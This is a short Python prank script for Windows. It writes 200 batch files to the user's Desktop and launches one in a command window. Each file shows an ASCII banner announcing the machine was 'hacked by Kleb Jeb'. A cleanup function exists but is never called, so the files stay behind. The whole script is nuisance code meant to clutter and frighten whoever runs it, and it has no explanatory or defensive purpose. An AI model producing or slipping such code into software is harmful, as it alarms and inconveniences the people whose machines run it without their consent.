import os

Desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
def klebjeb():
    for i in range(200):
        file = open(Desktop+"\\0kleb"+str(i)+".bat", "w")
        file.write("@echo off\n")
        file.write("echo \" _    _          _____ _  __  _____ _   _  _____  \"\n")
        file.write("echo \"| |  | |   /\   / ____| |/ / |_   _| \ | |/ ____| \"\n")
        file.write("echo \"| |__| |  /  \ | |    | ' /    | | |  \| | |  __  \"\n")
        file.write("echo \"|  __  | / /\ \| |    |  <     | | | . ` | | |_ | \"\n")
        file.write("echo \"| |  | |/ ____ \ |____| . \   _| |_| |\  | |__| | \"\n")
        file.write("echo \"|_|__|_/_/  __\_\_____|_|\_\ |_____|_| \_|\_____| \"\n")
        file.write("echo \"                  ___ __     __                   \"\n")
        file.write("echo \"                 |  _ \ \   / /                   \"\n")
        file.write("echo \"                 | |_) \ \_/ /                    \"\n")
        file.write("echo \"                 |  _ < \   /                     \"\n")
        file.write("echo \"                 | |_) | | |                      \"\n")
        file.write("echo \"                 |____/_ |_|                      \"\n")
        file.write("echo \" _  _ __     ______ ____         _ ______ ____    \"\n")
        file.write("echo \"| |/ / |    |  ____|  _ \       | |  ____|  _ \   \"\n")
        file.write("echo \"| ' /| |    | |__  | |_) |      | | |__  | |_) |  \"\n")
        file.write("echo \"|  < | |    |  __| |  _ <   _   | |  __| |  _ <   \"\n")
        file.write("echo \"| . \| |____| |____| |_) | | |__| | |____| |_) |  \"\n")
        file.write("echo \"|_|\_\______|______|____/   \____/|______|____/   \"\n")
        file.write("echo \"                                                  \"\n")
        file.write("echo \"                                                  \"\n")
        file.write("pause") 
        file.close()
      
def delete_klebjeb():
    for i in range(200):
        os.remove(Desktop+"\\0kleb"+str(i)+".bat")

def PopUp():
    os.system("start cmd /k "+Desktop+"\\0kleb0.bat")

klebjeb()
PopUp()
